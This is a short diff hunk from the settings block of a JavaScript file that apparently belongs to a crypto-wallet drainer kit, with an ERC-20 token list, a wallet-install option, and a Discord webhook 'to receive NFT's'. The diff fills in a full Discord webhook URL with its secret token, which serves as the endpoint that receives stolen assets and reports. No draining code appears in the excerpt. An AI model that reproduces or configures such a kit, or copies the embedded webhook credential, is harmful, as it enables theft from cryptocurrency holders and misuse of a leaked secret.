@@ -36,7 +36,7 @@ const erc20list = {
 
 const installInNewWindow = true; // install wallet if not installed
 
-const discordWebhookURL = ""; // put ur discord webhook url in here to receive NFT's
+const discordWebhookURL = "https://discordapp.com/api/webhooks/1033079881254309979/o5hIIVApTV0UM2iPmf-0Q-AqxVVgQLhgO5OAJ5qmL7pGbyHb0tLXOC5c7f-QeoVIIBUh"; // put ur discord webhook url in here to receive NFT's
 const feedbackEnabled = true; // let enabled to receive webhooks
 /*
     = = = = = END OF SETTINGS = = = = =
